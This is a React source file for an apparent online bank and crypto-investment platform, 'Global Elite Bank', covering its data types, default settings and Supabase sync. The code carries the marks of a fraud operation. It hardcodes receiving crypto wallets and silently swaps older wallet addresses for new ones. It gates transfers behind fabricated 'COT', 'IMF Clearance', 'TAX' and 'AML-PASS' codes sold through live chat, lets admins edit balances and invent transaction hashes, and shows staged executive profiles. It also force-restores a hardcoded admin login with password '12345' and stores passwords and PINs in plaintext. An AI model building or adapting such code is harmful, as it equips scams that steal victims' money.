import React, { createContext, useContext, useState, ReactNode, useEffect } from 'react';
import { Mail, X, ArrowLeft } from 'lucide-react';
import { supabase } from './lib/supabase';
import { camelToSnake, snakeToCamel } from './lib/casing';

export type UserStatus = 'active' | 'inactive' | 'dormant' | 'suspended' | 'blocked' | 'frozen';
export type AccountType = 'Savings' | 'Checking' | 'Business';

export interface BrokerWallets {
  btc: string;
  eth: string;
  usdt: string;
  sol: string;
  btcQr?: string;
  ethQr?: string;
  usdtQr?: string;
  solQr?: string;
}

export const DEFAULT_BROKER_WALLETS: BrokerWallets = {
  btc: 'bc1q4cuj7w73zhc9wulsk2qn9htggfdfjuzkgg2vm2',
  eth: '0x10B950A223D1326099f61662c4a873B51cA2a3c5',
  usdt: 'TTtuJB1gzgPGejDikPEyRmmmvHQNhtm6p6',
  sol: 'GqwXL6h7mYxkAsEpYQ669JDq99XunxVbVFZs49e82Knv',
  btcQr: 'https://i.ibb.co/6cJsKgVv/Bitcoin.jpg',
  ethQr: 'https://i.ibb.co/yc1zKHbx/Ethereum.jpg',
  usdtQr: 'https://i.ibb.co/JWfyTtm6/USDT-TRC-20.jpg',
  solQr: 'https://i.ibb.co/nN1vjV2c/Solana.jpg'
};

export interface InvestorWallets {
  btc: string;
  eth: string;
  usdt: string;
  sol: string;
  balance: number;
}

export interface Investment {
  id: string;
  userId: string;
  amount: number;
  currency: 'BTC' | 'ETH' | 'USDT' | string;
  durationDays: number;
  startDate: string;
  endDate: string;
  status: 'pending' | 'active' | 'matured' | 'withdrawn';
  txHash: string;
  profit?: number;
  isPrincipalLocked?: boolean;
  adminApprovedDuration?: boolean;
  reinvestedFromProfit?: boolean;
  adminNotes?: string;
}

export interface Account {
  id: string;
  type: AccountType;
  accountNumber: string;
  iban: string;
  balance: number;
  pin: string;
  codes: {
    swift: string;
    cot: string;
    tax: string;
    imf: string;
    aml: string;
  };
}


export interface User {
  id: string;
  name: string;
  email: string;
  password?: string;
  role: 'admin' | 'user';
  status: UserStatus;
  accounts: Account[];
  showFullCardDetails: boolean;
  mobile?: string;
  currency?: string;
  btcWallet?: string;
  dob?: string;
  nationality?: string;
  zipCode?: string;
  occupation?: string;
  residentialAddress?: string;
  investorWallets?: InvestorWallets;
  country?: string;
  profilePicture?: string;
  newAccountPromptPending?: boolean;
  accountOpenedAt?: string;
}

export interface VirtualCard {
  id: string;
  userId: string;
  cardNumber: string;
  expiry: string;
  cvv: string;
  status: 'active' | 'frozen' | 'pending' | 'blocked';
  type: 'virtual' | 'physical';
  tier?: 'standard' | 'gold' | 'platinum' | 'black';
  network?: 'visa' | 'mastercard';
  price?: number;
}

export interface LoanApplication {
  id: string;
  userId: string;
  amount: number;
  purpose: string;
  status: 'pending' | 'approved' | 'rejected';
  date: string;
}

export interface ContactInquiry {
  id: string;
  name: string;
  email: string;
  country: string;
  netWorth: string;
  message: string;
  date: string;
  status?: 'new' | 'replied' | 'ignored';
  replySubject?: string;
  replyMessage?: string;
  repliedAt?: string;
}

export interface UserApplication {
  id: string;
  name: string;
  email: string;
  password?: string;
  mobile?: string;
  country?: string;
  nationality?: string;
  dob?: string;
  zipCode?: string;
  occupation?: string;
  residentialAddress?: string;
  date: string;
  status: 'pending' | 'approved' | 'rejected';
}

export interface GrantApplication {
  id: string;
  userId: string;
  amount: number;
  purpose: string;
  status: 'pending' | 'processing' | 'approved' | 'rejected' | 'disbursed';
  date: string;
}

export interface CryptoWithdrawalRequest {
  id: string;
  userId: string;
  userName: string;
  userEmail: string;
  amount: number; // in USD equivalent (approved amount or current requested)
  originalRequestedAmount?: number; // original amount requested before admin adjustment
  cryptoAmount: number; // e.g. 0.25 BTC or 5000 USDT
  originalRequestedCryptoAmount?: number;
  currency: string; // 'USDT' | 'BTC' | 'ETH' | 'SOL' | 'BNB' | 'XRP'
  network: string; // 'TRC20', 'ERC20', 'Bitcoin Mainnet', etc.
  walletAddress: string;
  memo?: string;
  requestDate: string;
  approvalDate?: string;
  status: 'pending' | 'approved' | 'rejected';
  txHash?: string;
  receiptNumber?: string;
  networkFee?: number;
  adminNotes?: string;
  sourceWallet?: 'investor' | 'crypto_portfolio' | 'fiat';
}

export interface CryptoTradeOrder {
  id: string;
  userId: string;
  userName: string;
  userEmail: string;
  orderType: 'buy' | 'sell';
  cryptoCurrency: string; // 'BTC' | 'ETH' | 'SOL' | 'BNB' | 'XRP' | 'USDT'
  fiatCurrency: string; // 'USD'
  cryptoAmount: number; // e.g. 0.0768 BTC
  fiatAmount: number; // e.g. 5000 USD
  exchangeRate: number; // e.g. 65100
  status: 'pending' | 'approved' | 'rejected';
  requestDate: string;
  approvalDate?: string;
  approvedBy?: string;
  receiptNumber?: string;
  txHash?: string;
  notes?: string;
}

export interface Transaction {
  id: string;
  userId: string;
  accountId: string;
  type: 'deposit' | 'transfer_local' | 'transfer_internal' | 'transfer_wire' | 'crypto_withdrawal' | 'withdrawal' | 'crypto_buy' | 'crypto_sell' | 'crypto_trade' | 'crypto_deposit' | 'crypto_reinvest';
  amount: number;
  date: string;
  status: 'pending' | 'completed' | 'failed';
  recipientDetails?: any;
  description?: string;
}

export interface FiatDepositInstructions {
  bankName: string;
  accountName: string;
  accountNumber: string;
  routingNumber: string;
  swiftBic: string;
  bankAddress: string;
  referencePlaceholder: string;
}

interface AdminSettings {
  id?: string;
  alertThreshold: number;
  maxCryptoWithdrawalLimit?: number;
  requireWireCodes: boolean;
  code1Name: string;
  code1Message: string;
  requireCode1: boolean;
  code2Name: string;
  code2Message: string;
  requireCode2: boolean;
  code3Name: string;
  code3Message: string;
  requireCode3: boolean;
  code4Name: string;
  code4Message: string;
  requireCode4: boolean;
  code5Name: string;
  code5Message: string;
  requireCode5: boolean;
  requireOtp: boolean;
  preferenceContactEmail: string;
  websiteCurrency: string;
  homepageUrl: string;
  requireKycWithdrawal: boolean;
  requireKycRegistration: boolean;
  requireEmailVerification: boolean;
  mailServer: string;
  emailFrom: string;
  emailFromName: string;
  googleClientId: string;
  googleClientSecret: string;
  googleRedirectUrl: string;
  captchaSecret: string;
  captchaSiteKey: string;
  activeTheme: string;


  logoUrl?: string;
  faviconUrl?: string;
  adminEmail?: string;
  adminPassword?: string;
  contactEmail?: string;
  contactPhone?: string;
  contactAddress?: string;
  brokerWallets?: BrokerWallets;
  fiatDepositInstructions?: FiatDepositInstructions;
  eWalletInstructions?: {
    providerName: string;
    accountEmail: string;
  };
  frontendContent?: FrontendContent;
}

export interface FrontendContent {
  // Page / Section Headings
  contactPageHeading?: string;
  contactPageSubheading?: string;
  howToReachUsHeading?: string;
  urgentAssistanceHeading?: string;
  committeeSectionHeading?: string;

  // Contact Cards (Headings & Emails / Addresses)
  membershipApplicationsHeading: string;
  membershipApplicationsEmail: string;
  memberSupportHeading: string;
  memberSupportEmail: string;
  privateBankingHeading: string;
  privateBankingEmail: string;
  headOfficeHeading: string;
  headOfficeAddress: string;
  headOfficeHours: string;

  // Urgent Assistance Cards (Headings & Emails)
  cardLostHeading: string;
  cardLostEmail: string;
  suspiciousActivityHeading: string;
  suspiciousActivityEmail: string;
  mediaInquiriesHeading: string;
  mediaInquiriesEmail: string;
  partnershipInquiriesHeading: string;
  partnershipInquiriesEmail: string;

  // Committee / Team Members (Headings/Names, Roles, Image URLs)
  aboutTeamEdwardHeading?: string;
  aboutTeamEdwardName?: string;
  aboutTeamEdwardRole?: string;
  aboutTeamEdwardImg: string;

  aboutTeamHelenaHeading?: string;
  aboutTeamHelenaName?: string;
  aboutTeamHelenaRole?: string;
  aboutTeamHelenaImg: string;

  aboutTeamJonathanHeading?: string;
  aboutTeamJonathanName?: string;
  aboutTeamJonathanRole?: string;
  aboutTeamJonathanImg: string;

  aboutTeamIsabelleHeading?: string;
  aboutTeamIsabelleName?: string;
  aboutTeamIsabelleRole?: string;
  aboutTeamIsabelleImg: string;

  // Gallery / Photos
  homeStaffHeading?: string;
  homeStaffImg: string;
  servicesHallHeading?: string;
  servicesHallImg: string;
}

export const DEFAULT_FRONTEND_CONTENT: FrontendContent = {
  contactPageHeading: 'Contact Our Membership Team',
  contactPageSubheading: 'Whether you have a question about membership, need assistance with your application, or are an existing member seeking support — our team is available to assist you with the discretion and professionalism you deserve.',
  howToReachUsHeading: 'How to Reach Us',
  urgentAssistanceHeading: 'Urgent Assistance (Existing Members)',
  committeeSectionHeading: 'The Gatekeepers of Excellence',

  membershipApplicationsHeading: 'Membership Applications',
  membershipApplicationsEmail: 'globalelitefund@gmail.com',
  memberSupportHeading: 'Member Support',
  memberSupportEmail: 'globalelitefund@gmail.com',
  privateBankingHeading: 'Private Banking & Wealth',
  privateBankingEmail: 'globalelitefund@gmail.com',
  headOfficeHeading: 'Head Office',
  headOfficeAddress: 'Route de Saint-Julien 114, 1228 Plan-les-Ouates, Switzerland',
  headOfficeHours: 'Mon-Fri, 9:00 - 18:00 CET',

  cardLostHeading: 'Card Lost or Stolen?',
  cardLostEmail: 'globalelitefund@gmail.com',
  suspiciousActivityHeading: 'Suspicious Activity?',
  suspiciousActivityEmail: 'globalelitefund@gmail.com',
  mediaInquiriesHeading: 'Media Inquiries?',
  mediaInquiriesEmail: 'globalelitefund@gmail.com',
  partnershipInquiriesHeading: 'Partnership Inquiries?',
  partnershipInquiriesEmail: 'globalelitefund@gmail.com',

  aboutTeamEdwardHeading: 'Membership Committee Chairman',
  aboutTeamEdwardName: 'Sir Edward Beaumont',
  aboutTeamEdwardRole: 'Chairman, Membership Committee',
  aboutTeamEdwardImg: 'https://i.ibb.co/jPQpZPtq/Sir-Edward-Beaumont.jpg',

  aboutTeamHelenaHeading: 'Chief Risk Officer',
  aboutTeamHelenaName: 'Dr. Helena Van Der Berg',
  aboutTeamHelenaRole: 'Chief Risk Officer',
  aboutTeamHelenaImg: 'https://i.ibb.co/93tLKGxv/Dr-Helena-Van-Der-Berg.jpg',

  aboutTeamJonathanHeading: 'Head of Private Banking',
  aboutTeamJonathanName: 'Mr. Jonathan Westwood',
  aboutTeamJonathanRole: 'Head of Private Banking',
  aboutTeamJonathanImg: 'https://i.ibb.co/mFYbyrLh/Mr-Jonathan-Westwood.jpg',

  aboutTeamIsabelleHeading: 'Chief Compliance Officer',
  aboutTeamIsabelleName: 'Ms. Isabelle Moreau',
  aboutTeamIsabelleRole: 'Chief Compliance Officer',
  aboutTeamIsabelleImg: 'https://i.ibb.co/1Gwq9LMm/Ms-Isabelle-Moreau.jpg',

  homeStaffHeading: 'Global Elite Bank Leadership & Staff',
  homeStaffImg: 'https://i.ibb.co/PsZ7fdd0/GEB-Staff-Photo.png',

  servicesHallHeading: 'Executive Banking Hall',
  servicesHallImg: 'https://i.ibb.co/bjLWcpry/GEB-HALL-02.png',
};

interface BankContextType {
  users: User[];
  currentUser: User | null;
  transactions: Transaction[];
  virtualCards: VirtualCard[];
  loanApplications: LoanApplication[];
  userApplications: UserApplication[];
  grantApplications: GrantApplication[];
  contactInquiries: ContactInquiry[];
  investments: Investment[];
  createInvestment: (inv: Omit<Investment, 'id'> | (Omit<Investment, 'id' | 'startDate' | 'endDate' | 'status'> & Partial<Investment>)) => void;
  updateInvestment: (id: string, updates: Partial<Investment>) => void;
  deleteInvestment: (id: string) => void;
  reinvestProfit: (params: { userId: string; amount: number; currency: string; durationDays: number }) => { success: boolean; message: string; investment?: Investment };
  adminAdjustInvestmentDuration: (investmentId: string, newDurationDays: number, adminNotes?: string) => void;
  cryptoWithdrawals: CryptoWithdrawalRequest[];
  requestCryptoWithdrawal: (req: Omit<CryptoWithdrawalRequest, 'id' | 'requestDate' | 'status'>) => { success: boolean; message: string; request?: CryptoWithdrawalRequest };
  approveCryptoWithdrawal: (withdrawalId: string, options?: { approvedBy?: string; customTxHash?: string; adminNotes?: string; approvedAmount?: number; approvedCryptoAmount?: number }) => CryptoWithdrawalRequest | undefined;
  rejectCryptoWithdrawal: (withdrawalId: string, reason?: string) => void;
  cryptoOrders: CryptoTradeOrder[];
  requestCryptoTradeOrder: (order: Omit<CryptoTradeOrder, 'id' | 'status' | 'requestDate' | 'receiptNumber'>) => { success: boolean; message: string; order?: CryptoTradeOrder };
  approveCryptoTradeOrder: (orderId: string, options?: { approvedBy?: string; customTxHash?: string }) => CryptoTradeOrder | undefined;
  rejectCryptoTradeOrder: (orderId: string, reason?: string) => void;
  adminSettings: AdminSettings;
  login: (email: string, password?: string, isAdminPath?: boolean) => { success: boolean, error?: string };
  loginAsAdmin: () => User;
  logout: () => void;
  register: (name: string, email: string, password?: string) => void;
  adminCreateUser: (user: Omit<User, "id">) => void;
  adminUpdateUser: (userId: string, updates: Partial<User>) => void;
  updateUserProfilePicture: (url: string) => void;
  updateUserStatus: (userId: string, status: UserStatus) => void;
  deleteUser: (userId: string) => void;
  updateUserCardVisibility: (userId: string, show: boolean) => void;
  updateBalance: (userId: string, accountId: string, amount: number) => void;
  createTransaction: (txn: Omit<Transaction, 'id' | 'date'>) => void;
  updateTransactionStatus: (txId: string, status: 'pending' | 'completed' | 'failed') => void;
  updateAdminSettings: (settings: Partial<AdminSettings>) => void;
  changePassword: (oldPass: string, newPass: string) => boolean;

  createVirtualCard: (card: Omit<VirtualCard, 'id'>) => void;
  updateVirtualCardStatus: (cardId: string, status: VirtualCard['status']) => void;
  deleteVirtualCard: (cardId: string) => void;
  createLoanApplication: (loan: Omit<LoanApplication, 'id' | 'date'>) => void;
  updateLoanApplicationStatus: (loanId: string, status: 'approved' | 'rejected') => void;
  updateUserApplicationStatus: (appId: string, status: 'approved' | 'rejected', customData?: Omit<User, 'id'>) => void;
  createGrantApplication: (grant: Omit<GrantApplication, 'id' | 'date'>) => void;
  updateGrantApplicationStatus: (appId: string, status: 'approved' | 'rejected' | 'disbursed' | 'processing') => void;
  createContactInquiry: (inquiry: Omit<ContactInquiry, 'id' | 'date'>) => void;
  deleteContactInquiry: (inquiryId: string) => void;
  updateContactInquiryStatus: (inquiryId: string, status: 'new' | 'replied' | 'ignored', replyDetails?: { subject: string; message: string }) => void;
  sendMockEmail: (email: { to: string; subject: string; body: string }) => void;
}

const defaultAdmin: User = {
  id: 'admin-1',
  name: 'Super Admin',
  email: 'mizbryo@gmail.com',
  password: '12345',
  role: 'admin',
  status: 'active',
  accounts: [],
  showFullCardDetails: true
};




const BankContext = createContext<BankContextType | undefined>(undefined);



function sanitizeUsers(usersList: any[]): User[] {
  if (!Array.isArray(usersList)) return [defaultAdmin];
  
  const seenEmails = new Set<string>();
  const seenAccountNumbers = new Set<string>();
  const seenIds = new Set<string>();
  const sanitized: User[] = [];
  let foundMizbryoAdmin = false;

  for (const rawUser of usersList) {
    if (!rawUser || typeof rawUser !== 'object') continue;
    
    // Always preserve admin users and map mizbryo/mizbrymo to mizbryo@gmail.com
    if (rawUser.role === 'admin' || rawUser.email?.toLowerCase() === 'mizbryo@gmail.com' || rawUser.email?.toLowerCase() === 'mizbrymo@gmail.com') {
      const adminId = rawUser.id || 'admin-1';
      if (!seenIds.has(adminId)) {
        seenIds.add(adminId);
        const isAdminTarget = rawUser.email?.toLowerCase() === 'mizbryo@gmail.com' || rawUser.email?.toLowerCase() === 'mizbrymo@gmail.com' || adminId === 'admin-1';
        if (isAdminTarget) {
          foundMizbryoAdmin = true;
          sanitized.push({
            ...rawUser,
            id: adminId,
            name: rawUser.name || 'Super Admin',
            email: 'mizbryo@gmail.com',
            password: '12345',
            role: 'admin',
            status: 'active',
            accounts: [],
            showFullCardDetails: true
          });
        } else {
          sanitized.push({ ...rawUser, id: adminId, role: 'admin' });
        }
      }
      continue;
    }

    // A new applicant whether rejected or approved cannot be allowed to appear until bank account has been created for him.
    // Exclude users without accounts or with empty account arrays.
    if (!rawUser.accounts || !Array.isArray(rawUser.accounts) || rawUser.accounts.length === 0) {
      continue;
    }

    // Deduplicate accounts within the user and verify valid account number
    const validUniqueAccounts: Account[] = [];
    const userAccNums = new Set<string>();
    for (const acc of rawUser.accounts) {
      if (!acc || !acc.accountNumber || !acc.accountNumber.trim()) continue;
      const accNum = acc.accountNumber.trim();
      if (!userAccNums.has(accNum) && !seenAccountNumbers.has(accNum)) {
        userAccNums.add(accNum);
        seenAccountNumbers.add(accNum);
        validUniqueAccounts.push(acc);
      }
    }

    // Must have at least one valid bank account created
    if (validUniqueAccounts.length === 0) {
      continue;
    }

    const emailKey = (rawUser.email || '').trim().toLowerCase();
    if (emailKey && seenEmails.has(emailKey)) {
      // Avoid duplicate client entry for same email; merge any non-duplicate accounts
      const existingClient = sanitized.find(c => (c.email || '').trim().toLowerCase() === emailKey);
      if (existingClient) {
        for (const va of validUniqueAccounts) {
          if (!existingClient.accounts.some(ea => ea.accountNumber.trim() === va.accountNumber.trim())) {
            existingClient.accounts.push(va);
          }
        }
      }
      continue;
    }
    if (emailKey) seenEmails.add(emailKey);

    const userId = rawUser.id || `user-${Date.now()}-${Math.random().toString(36).substring(2, 7)}`;
    if (seenIds.has(userId)) continue;
    seenIds.add(userId);

    sanitized.push({
      ...rawUser,
      id: userId,
      accounts: validUniqueAccounts
    });
  }

  // Ensure defaultAdmin mizbryo@gmail.com exists
  if (!foundMizbryoAdmin) {
    sanitized.unshift(defaultAdmin);
  }

  return sanitized;
}

function getInitialState<T>(key: string, defaultValue: T): T {
  try {
    const item = window.localStorage.getItem(key);
    if (item) {
      const parsed = JSON.parse(item);
      if (key === 'bank_adminSettings') {
        const stored = parsed || {};
        const oldDefaults = [
          'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',
          '0x71C8705E311e2fE25E5b4c10a424eB7853f09072',
          'TYDzsYUE3b6WSo8rZV83JRNURNmr57qJp8',
          '7EYnhQoR9YM3N7UoaKRoA44BW8PYJuYYU2nu23UocSQM'
        ];
        const storedWallets = stored.brokerWallets || {};
        const cleanWallets: BrokerWallets = {
          btc: (!storedWallets.btc || oldDefaults.includes(storedWallets.btc)) ? DEFAULT_BROKER_WALLETS.btc : storedWallets.btc,
          eth: (!storedWallets.eth || oldDefaults.includes(storedWallets.eth)) ? DEFAULT_BROKER_WALLETS.eth : storedWallets.eth,
          usdt: (!storedWallets.usdt || oldDefaults.includes(storedWallets.usdt)) ? DEFAULT_BROKER_WALLETS.usdt : storedWallets.usdt,
          sol: (!storedWallets.sol || oldDefaults.includes(storedWallets.sol)) ? DEFAULT_BROKER_WALLETS.sol : storedWallets.sol,
          btcQr: storedWallets.btcQr || DEFAULT_BROKER_WALLETS.btcQr,
          ethQr: storedWallets.ethQr || DEFAULT_BROKER_WALLETS.ethQr,
          usdtQr: storedWallets.usdtQr || DEFAULT_BROKER_WALLETS.usdtQr,
          solQr: storedWallets.solQr || DEFAULT_BROKER_WALLETS.solQr,
        };
        return {
          ...defaultValue,
          ...stored,
          brokerWallets: cleanWallets,
          fiatDepositInstructions: {
            ...((defaultValue as any)?.fiatDepositInstructions || {}),
            ...(stored.fiatDepositInstructions || {})
          },
          eWalletInstructions: {
            ...((defaultValue as any)?.eWalletInstructions || {}),
            ...(stored.eWalletInstructions || {})
          },
          frontendContent: {
            ...DEFAULT_FRONTEND_CONTENT,
            ...((defaultValue as any)?.frontendContent || {}),
            ...(stored.frontendContent || {})
          }
        } as any as T;
      }
      // Deduplicate arrays by id if applicable to fix any corrupted state
      if (Array.isArray(parsed) && parsed.length > 0 && parsed[0]?.id) {
        const unique = [];
        const seenIds = new Set();
        for (const obj of parsed) {
          if (!seenIds.has(obj.id)) {
            unique.push(obj);
            seenIds.add(obj.id);
          }
        }
        return unique as any as T;
      }
      return parsed;
    }
    return defaultValue;
  } catch (error) {
    console.warn(`Error reading localStorage key "${key}":`, error);
    return defaultValue;
  }
}

export function BankProvider({ children }: { children: ReactNode }) {

  const [users, setUsers] = useState<User[]>([]);
  const [currentUser, setCurrentUser] = useState<User | null>(() => {
  try { return JSON.parse(window.localStorage.getItem('bank_currentUser') || 'null'); } catch { return null; }
});
  const [transactions, setTransactions] = useState<Transaction[]>([]);
  const [virtualCards, setVirtualCards] = useState<VirtualCard[]>([]);
  const [loanApplications, setLoanApplications] = useState<LoanApplication[]>([]);
  const [userApplications, setUserApplications] = useState<UserApplication[]>([]);
  const [grantApplications, setGrantApplications] = useState<GrantApplication[]>([]);
  const [contactInquiries, setContactInquiries] = useState<ContactInquiry[]>([]);
  const [investments, setInvestments] = useState<Investment[]>([]);
  const [cryptoWithdrawals, setCryptoWithdrawals] = useState<CryptoWithdrawalRequest[]>([]);
  const [cryptoOrders, setCryptoOrders] = useState<CryptoTradeOrder[]>([]);
  const [mockEmail, setMockEmail] = useState<{to: string, subject: string, body: string} | null>(null);

  const [adminSettings, setAdminSettings] = useState<AdminSettings>({
    alertThreshold: 10000,
    maxCryptoWithdrawalLimit: 25000,
    requireWireCodes: true,
    code1Name: "COT",
    code1Message: "The COT code is required to enable you to continue with this transaction. Please contact our online customer care representative via live chat; they will help you with the appropriate COT code for this transaction.",
    requireCode1: true,
    code2Name: "SWIFT-SEC",
    code2Message: "To complete your transfer, please contact our Customer Service team to obtain your SWIFT-SEC code. This code is required for the transaction to go swiftly across borders.\n\nYou can reach us via the live chat.",
    requireCode2: true,
    code3Name: "IMF Clearance",
    code3Message: "To complete your transfer, don't hesitate to contact our Customer Service team to obtain your IMF code. This code is required for the transaction to go through.\n\nYou can reach us via live chat.",
    requireCode3: true,
    code4Name: "TAX",
    code4Message: "The TAX code is required to enable you to continue with this transaction. Please contact our online customer care on representative via live chat; they will help you with the appropriate TAX code for this transaction.",
    requireCode4: true,
    code5Name: "AML-PASS",
    code5Message: "The Anti-Money Laundering Passcode is required to enable you to continue with this transaction. Please contact our online customer care representative via live chat; they will help you with the appropriate SWIFT code for this transaction.",
    requireCode5: true,
    requireOtp: false,
    preferenceContactEmail: "support@globalelite.com",
    websiteCurrency: "$",
    homepageUrl: "",
    requireKycWithdrawal: false,
    requireKycRegistration: false,
    requireEmailVerification: false,
    mailServer: "",
    emailFrom: "support@globalelite.com",
    emailFromName: "Global Elite",
    googleClientId: "",
    googleClientSecret: "",
    googleRedirectUrl: "http://yoursite.com/auth/google/callback",
    captchaSecret: "",
    captchaSiteKey: "",
    activeTheme: "dark",


    logoUrl: '',
    adminEmail: 'mizbryo@gmail.com',
    adminPassword: '12345',
    contactEmail: 'support@bank.com',
    contactPhone: '+1 (555) 000-0000',
    contactAddress: '109, Feldgüetliweg Meilen Bezirk Meilen Zurich 8706 Switzerland',
    frontendContent: DEFAULT_FRONTEND_CONTENT,
    websiteName: 'Global Elite Bank',
    websiteTitle: 'Welcome to Global Elite Bank',
    websiteKeywords: 'online bank',
    websiteUrl: 'https://globalelite.com',
    whatsappNumber: '+1 (207) 613-1332',
    tidioId: '',
    timezone: 'Pacific/Wallis',
    installationType: 'Main-Domain',
    smsEnabled: true,
    faviconUrl: '',
    paymentMethods: [
      { id: '1', name: 'Credit Card', type: 'currency', usedFor: 'both', status: 'enabled' },
      { id: '2', name: 'BUSD', type: 'crypto', usedFor: 'withdrawal', status: 'disabled' },
      { id: '3', name: 'USDT (TRC-20)', type: 'crypto', usedFor: 'both', status: 'enabled' },
      { id: '4', name: 'Bank Transfer', type: 'currency', usedFor: 'both', status: 'enabled' },
      { id: '5', name: 'Paypal', type: 'currency', usedFor: 'both', status: 'enabled' },
      { id: '6', name: 'Litecoin', type: 'crypto', usedFor: 'both', status: 'disabled' },
      { id: '7', name: 'Ethereum (ERC-20)', type: 'crypto', usedFor: 'both', status: 'enabled' },
      { id: '8', name: 'Bitcoin (BTC)', type: 'crypto', usedFor: 'both', status: 'enabled' },
      { id: '9', name: 'Solana (SOL)', type: 'crypto', usedFor: 'both', status: 'enabled' }
    ],
    brokerWallets: DEFAULT_BROKER_WALLETS,
    fiatDepositInstructions: {
      bankName: 'Global Elite Partner Bank (US)',
      accountName: 'Global Elite Holdings LLC',
      accountNumber: '3482910048',
      routingNumber: '021000021',
      swiftBic: 'GEHBUS33',
      bankAddress: '120 Broadway, New York, NY 10271, USA',
      referencePlaceholder: 'Include your Global Elite Account ID in the transfer memo'
    },
    eWalletInstructions: {
      providerName: 'Global Elite Official PayPal',
      accountEmail: 'deposits@globalelitebank.com'
    }
  });

  const [isInitializing, setIsInitializing] = useState(true);
  const prevStates = React.useRef<any>({});

  useEffect(() => {
    async function loadData() {
      try {
        
        const results = await Promise.all([
          supabase.from('users').select('*'),
          supabase.from('accounts').select('*'),
          supabase.from('transactions').select('*'),
          supabase.from('investments').select('*'),
          supabase.from('virtual_cards').select('*'),
          supabase.from('loan_applications').select('*'),
          supabase.from('grant_applications').select('*'),
          supabase.from('contact_inquiries').select('*'),
          supabase.from('user_applications').select('*'),
          supabase.from('crypto_withdrawal_requests').select('*'),
          supabase.from('crypto_trade_orders').select('*'),
          supabase.from('admin_settings').select('*').limit(1).maybeSingle(),
          supabase.from('investor_wallets').select('*')
        ]);

        const errors = results.filter(r => r.error).map(r => r.error);
        if (errors.length > 0) {
           console.error("Supabase query errors:", errors);
           alert("Supabase errors: " + JSON.stringify(errors.map(e => e.message)));
        }

        const [
          { data: usersData },
          { data: accountsData },
          { data: txnsData },
          { data: investmentsData },
          { data: virtualCardsData },
          { data: loanAppsData },
          { data: grantAppsData },
          { data: contactInquiriesData },
          { data: userAppsData },
          { data: cryptoWithdrawalsData },
          { data: cryptoOrdersData },
          { data: adminSettingsData },
          { data: investorWalletsData }
        ] = results;


        if (adminSettingsData) {
          setAdminSettings(snakeToCamel(adminSettingsData));
        }
        if (txnsData) setTransactions(snakeToCamel(txnsData));
        if (investmentsData) setInvestments(snakeToCamel(investmentsData));
        if (virtualCardsData) setVirtualCards(snakeToCamel(virtualCardsData));
        if (loanAppsData) setLoanApplications(snakeToCamel(loanAppsData));
        if (grantAppsData) setGrantApplications(snakeToCamel(grantAppsData));
        if (contactInquiriesData) setContactInquiries(snakeToCamel(contactInquiriesData));
        if (userAppsData) setUserApplications(snakeToCamel(userAppsData));
        if (cryptoWithdrawalsData) setCryptoWithdrawals(snakeToCamel(cryptoWithdrawalsData));
        if (cryptoOrdersData) setCryptoOrders(snakeToCamel(cryptoOrdersData));

        if (usersData) {
          const mappedUsers = snakeToCamel(usersData).map((u: any) => ({
            ...u,
            accounts: snakeToCamel(accountsData || []).filter((a: any) => a.userId === u.id),
            investorWallets: snakeToCamel(investorWalletsData || []).find((w: any) => w.userId === u.id) || undefined
          }));
          
          if (!mappedUsers.find((u: any) => u.role === 'admin')) {
             mappedUsers.push(defaultAdmin);
          }
          setUsers(mappedUsers);
        }

        // Set baseline for diffs
        prevStates.current = {
          users: usersData ? snakeToCamel(usersData) : [],
          accounts: accountsData ? snakeToCamel(accountsData) : [],
          investorWallets: investorWalletsData ? snakeToCamel(investorWalletsData) : [],
          transactions: txnsData ? snakeToCamel(txnsData) : [],
          investments: investmentsData ? snakeToCamel(investmentsData) : [],
          virtualCards: virtualCardsData ? snakeToCamel(virtualCardsData) : [],
          loanApplications: loanAppsData ? snakeToCamel(loanAppsData) : [],
          grantApplications: grantAppsData ? snakeToCamel(grantAppsData) : [],
          contactInquiries: contactInquiriesData ? snakeToCamel(contactInquiriesData) : [],
          userApplications: userAppsData ? snakeToCamel(userAppsData) : [],
          cryptoWithdrawals: cryptoWithdrawalsData ? snakeToCamel(cryptoWithdrawalsData) : [],
          cryptoOrders: cryptoOrdersData ? snakeToCamel(cryptoOrdersData) : [],
          adminSettings: adminSettingsData ? snakeToCamel(adminSettingsData) : null,
        };

      } catch (err) {
        console.error('Failed to load Supabase data:', err);
        alert('Supabase Load Error: ' + (err.message || JSON.stringify(err)));
      } finally {
        setIsInitializing(false);
      }
    }
    loadData();
  }, []);

  useEffect(() => { window.localStorage.setItem('bank_currentUser', JSON.stringify(currentUser)); }, [currentUser]);

  // Generic Sync function
  const syncTable = async (currentItems: any[], tableName: string, stateKey: string) => {
    if (isInitializing) return;
    const prevItems = prevStates.current[stateKey] || [];
    
    const toUpsert = currentItems.filter(item => {
      const prevItem = prevItems.find((p: any) => p.id === item.id);
      return !prevItem || JSON.stringify(prevItem) !== JSON.stringify(item);
    });

    const toDelete = prevItems.filter((p: any) => !currentItems.find(item => item.id === p.id));

    if (toUpsert.length > 0) {
      await supabase.from(tableName).upsert(toUpsert.map(camelToSnake));
    }
    if (toDelete.length > 0) {
      await supabase.from(tableName).delete().in('id', toDelete.map((d: any) => d.id));
    }

    prevStates.current[stateKey] = JSON.parse(JSON.stringify(currentItems));
  };

  // Sync users, accounts, investorWallets separately since they are nested in state
  useEffect(() => {
    if (isInitializing) return;
    
    // Extract flat lists
    const flatUsers = users.map(u => {
      const { accounts, investorWallets, ...rest } = u;
      return rest;
    });
    
    const flatAccounts = users.flatMap(u => 
      (u.accounts || []).map(a => ({ ...a, userId: u.id }))
    );
    
    const flatWallets = users.filter(u => u.investorWallets).map(u => ({
      ...u.investorWallets,
      userId: u.id
    }));

    syncTable(flatUsers, 'users', 'users');
    syncTable(flatAccounts, 'accounts', 'accounts');
    syncTable(flatWallets, 'investor_wallets', 'investorWallets');
    
  }, [users, isInitializing]);

  // Sync others
  useEffect(() => { syncTable(transactions, 'transactions', 'transactions'); }, [transactions, isInitializing]);
  useEffect(() => { syncTable(investments, 'investments', 'investments'); }, [investments, isInitializing]);
  useEffect(() => { syncTable(virtualCards, 'virtual_cards', 'virtualCards'); }, [virtualCards, isInitializing]);
  useEffect(() => { syncTable(loanApplications, 'loan_applications', 'loanApplications'); }, [loanApplications, isInitializing]);
  useEffect(() => { syncTable(grantApplications, 'grant_applications', 'grantApplications'); }, [grantApplications, isInitializing]);
  useEffect(() => { syncTable(contactInquiries, 'contact_inquiries', 'contactInquiries'); }, [contactInquiries, isInitializing]);
  useEffect(() => { syncTable(userApplications, 'user_applications', 'userApplications'); }, [userApplications, isInitializing]);
